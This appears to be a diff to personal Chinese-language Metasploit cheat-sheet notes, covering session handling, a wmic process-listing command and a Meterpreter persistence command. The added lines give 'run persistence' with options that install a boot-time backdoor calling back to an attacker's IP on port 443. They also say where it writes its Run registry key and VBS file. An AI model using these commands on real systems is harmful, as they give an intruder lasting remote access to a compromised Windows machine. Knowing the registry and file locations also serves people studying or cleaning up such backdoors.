@@ -7,3 +7,9 @@ msf > exploit
 msf > sessions -i <id>
 msf中不能输入中文: disable_unicode_encoding
              还原:enable_unicode_encoding
+查看进程名，路径，pid 再配合使用find或findstr就可以查到pid对应的路径了:wmic process get name,executablepath,processid|findstr pid
+meterpreter的后门创建:
+run persistence -X -i 5 -p 443 -r <ip>
+其将开机启动项加入HKLM\Software\Microsoft\Windows\CurrentVersion\Run\之中
+vbs文件在C:\Documents and Settings\Administrator\Local Settings\Temp\之中
+
